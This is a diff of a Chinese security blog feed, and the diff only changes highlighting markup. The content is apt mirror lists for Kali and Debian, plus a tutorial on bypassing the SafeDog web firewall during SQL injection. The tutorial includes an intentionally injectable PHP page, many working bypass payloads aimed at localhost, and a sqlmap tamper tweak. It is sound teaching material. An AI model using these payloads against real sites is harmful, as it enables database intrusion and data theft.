@@ -29,8 +29,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">vim /etc/apt/sources.list
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vim /etc/apt/sources.list
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="kali源">kali源</h2>
 <div class="highlight"><div class="chroma">
@@ -60,30 +60,30 @@
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#中科大</span>
-deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
- 
-<span class="c1">#阿里云</span>
-deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
- 
-<span class="c1">#清华大学</span>
-deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
- 
-<span class="c1">#浙大</span>
-deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
-deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
- 
-<span class="c1">#东软大学</span>
-deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
-deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
- 
-<span class="c1">#官方源</span>
-deb http://http.kali.org/kali kali-rolling main non-free contrib
-deb-src http://http.kali.org/kali kali-rolling main non-free contrib
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#中科大</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+</span></span><span class="line"><span class="cl">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#阿里云</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+</span></span><span class="line"><span class="cl">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#清华大学</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
+</span></span><span class="line"><span class="cl">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#浙大</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
+</span></span><span class="line"><span class="cl">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#东软大学</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
+</span></span><span class="line"><span class="cl">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">#官方源</span>
+</span></span><span class="line"><span class="cl">deb http://http.kali.org/kali kali-rolling main non-free contrib
+</span></span><span class="line"><span class="cl">deb-src http://http.kali.org/kali kali-rolling main non-free contrib
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="debian源">debian源</h2>
 <div class="highlight"><div class="chroma">
@@ -131,48 +131,48 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 中科大源</span>
-deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free
-deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free
-deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free
-deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free
-
-<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free</span>
-<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free</span>
-<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free</span>
-<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free</span>
-
-<span class="c1"># 阿里云</span>
-deb http://mirrors.aliyun.com/debian/ buster main non-free contrib
-deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib
-deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib
-deb http://mirrors.aliyun.com/debian-security buster/updates main
-
-<span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib</span>
-<span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib</span>
-<span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</span>
-<span class="c1">#deb-src http://mirrors.aliyun.com/debian-security buster/updates main</span>
-
-<span class="c1"># 网易源</span>
-deb http://mirrors.163.com/debian/ buster main non-free contrib
-deb http://mirrors.163.com/debian/ buster-updates main non-free contrib
-deb http://mirrors.163.com/debian/ buster-backports main non-free contrib
-deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib
-
-<span class="c1">#deb-src http://mirrors.163.com/debian/ buster main non-free contrib</span>
-<span class="c1">#deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib</span>
-<span class="c1">#deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib</span>
-<span class="c1">#deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib</span>
-
-<span class="c1"># 官方源</span>
-deb http://deb.debian.org/debian buster main contrib non-free
-deb http://deb.debian.org/debian buster-updates main contrib non-free
-deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
-
-<span class="c1">#deb-src http://deb.debian.org/debian buster main contrib non-free</span>
-<span class="c1">#deb-src http://deb.debian.org/debian buster-updates main contrib non-free</span>
-<span class="c1">#deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 中科大源</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free
+</span></span><span class="line"><span class="cl">deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free
+</span></span><span class="line"><span class="cl">deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free
+</span></span><span class="line"><span class="cl">deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 阿里云</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/debian/ buster main non-free contrib
+</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib
+</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib
+</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/debian-security buster/updates main
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.aliyun.com/debian-security buster/updates main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 网易源</span>
+</span></span><span class="line"><span class="cl">deb http://mirrors.163.com/debian/ buster main non-free contrib
+</span></span><span class="line"><span class="cl">deb http://mirrors.163.com/debian/ buster-updates main non-free contrib
+</span></span><span class="line"><span class="cl">deb http://mirrors.163.com/debian/ buster-backports main non-free contrib
+</span></span><span class="line"><span class="cl">deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.163.com/debian/ buster main non-free contrib</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 官方源</span>
+</span></span><span class="line"><span class="cl">deb http://deb.debian.org/debian buster main contrib non-free
+</span></span><span class="line"><span class="cl">deb http://deb.debian.org/debian buster-updates main contrib non-free
+</span></span><span class="line"><span class="cl">deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://deb.debian.org/debian buster main contrib non-free</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://deb.debian.org/debian buster-updates main contrib non-free</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="更新软件列表并更新软件">更新软件列表并更新软件</h2>
 <div class="highlight"><div class="chroma">
@@ -180,8 +180,8 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade -y
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade -y
+</span></span></code></pre></td></tr></table>
 </div>
 </div>]]></description>
 </item><item>
@@ -402,18 +402,18 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
-<span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());}</span>
-<span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;dvwa&#34;</span><span class="p">,</span> <span class="nv">$con</span><span class="p">);</span>
-<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT first_name,last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39;; &#34;</span><span class="p">;</span>
-<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">);</span>
-<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
-<span class="p">{</span> 
-<span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&amp;nbsp&#34;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">];</span> 
-<span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;}</span><span class="k">echo</span> <span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="nv">$query</span><span class="p">;</span>
-<span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;dvwa&#34;</span><span class="p">,</span> <span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT first_name,last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39;; &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&amp;nbsp&#34;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;}</span><span class="k">echo</span> <span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="nv">$query</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="绕过拦截and-11">绕过拦截and 1=1</h2>
 <p>首先先稍微测试一番,发现存在安全狗</p>
@@ -422,8 +422,8 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1  and 1=1%23
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1  and 1=1%23
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p></p>
 <div class="highlight"><div class="chroma">
@@ -438,15 +438,15 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">and  1	拦截
-and  &#39;1&#39;    拦截  
-and  a	不拦截 
-and  &#39;a&#39;    拦截  
-and  !	不拦截 
-and  1+1    拦截  
-and  1+a    拦截  
-and  hex(1)  不拦截
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and  1	拦截
+</span></span><span class="line"><span class="cl">and  &#39;1&#39;    拦截  
+</span></span><span class="line"><span class="cl">and  a	不拦截 
+</span></span><span class="line"><span class="cl">and  &#39;a&#39;    拦截  
+</span></span><span class="line"><span class="cl">and  !	不拦截 
+</span></span><span class="line"><span class="cl">and  1+1    拦截  
+</span></span><span class="line"><span class="cl">and  1+a    拦截  
+</span></span><span class="line"><span class="cl">and  hex(1)  不拦截
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路</p>
 <ul>
@@ -462,10 +462,10 @@ and  hex(1)  不拦截
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">与运算 a &amp; b  , 
-或运算 a | b ,  
-异或运算 a ^ b
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">与运算 a &amp; b  , 
+</span></span><span class="line"><span class="cl">或运算 a | b ,  
+</span></span><span class="line"><span class="cl">异或运算 a ^ b
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过</p>
 <div class="highlight"><div class="chroma">
@@ -473,8 +473,8 @@ and  hex(1)  不拦截
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
@@ -487,12 +487,12 @@ and  hex(1)  不拦截
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
-http://127.0.0.1/test.php?id=1&#39;   ||(1) %23 		//使用括号代替空格绕过
-//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
-http://127.0.0.1/test.php?id=1&#39;  xor 1%23			
-http://127.0.0.1/test.php?id=1&#39;  xor true%23
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;   ||(1) %23 		//使用括号代替空格绕过
+</span></span><span class="line"><span class="cl">//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;  xor 1%23			
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;  xor true%23
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="绕过order-by查询">绕过order by查询</h2>
 <p>判断查询字段,使用mysql的<code>/*!*/</code>内敛注释去绕过防护,而其中的代码是可以正常执行的</p>
@@ -501,8 +501,8 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p></p>
 <h2 id="绕过union-select查询">绕过union select查询</h2>
@@ -516,8 +516,8 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p></p>
 <ul>
@@ -531,8 +531,8 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>基于报错信息的注入绕安全狗</p>
@@ -542,9 +542,9 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
-http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="绕过select-from">绕过select from</h2>
 <p>使用大括号去绕过</p>
@@ -553,8 +553,8 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>使用反引号去绕过</p>
@@ -563,8 +563,8 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用\N去绕过</p>
 <div class="highlight"><div class="chroma">
@@ -572,8 +572,8 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>括号法去绕过</p>
 <div class="highlight"><div class="chroma">
@@ -581,8 +581,8 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>也可以组合起来</p>
 <div class="highlight"><div class="chroma">
@@ -590,8 +590,8 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这些都是去掉空格的合法语句,当然如果不拦截<code>/*/或/!*/</code>的话,也可以尝试这两个</p>
 <blockquote>
@@ -604,8 +604,8 @@ php+mysql环境下支持的空格有：</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中使用的最多的就是<code>%0a,%0b,%a0,/**/</code>，这四个当作空格插入在语句中来扰乱waf检测。
 干货分享：使用<code>/^!$asd%2a–=/</code>代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的<code>/*/换成/^!$asd%2a–=*/</code>即可使用sqlmap跑了。</p>
